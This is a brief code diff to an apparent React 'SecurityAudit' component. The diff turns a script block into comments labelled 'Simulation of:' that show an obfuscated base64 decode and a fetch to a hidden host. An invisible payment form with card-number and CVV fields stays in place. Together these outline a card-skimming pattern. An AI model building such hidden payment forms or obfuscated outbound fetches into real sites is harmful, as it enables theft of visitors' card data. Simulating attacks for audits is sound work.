@@ -32,10 +32,8 @@ const SecurityAudit = () => {
       <form id="PaymentForm" style={{ opacity: 0 }}>
         <input name="user_card_number" type="text" />
         <input name="user_cvv_code" type="text" />
-        <script dangerouslySetInnerHTML={{ __html: `
-          // Simulation of: atob('aHR0cHM6Ly8=') 
-          // Simulation of: fetch('https://' + _0x)
-        `}} />
+        {/* Simulation of: atob('aHR0cHM6Ly8=') */}
+        {/* Simulation of: fetch('https://' + _0x) */}
       </form>
 
       {/* 
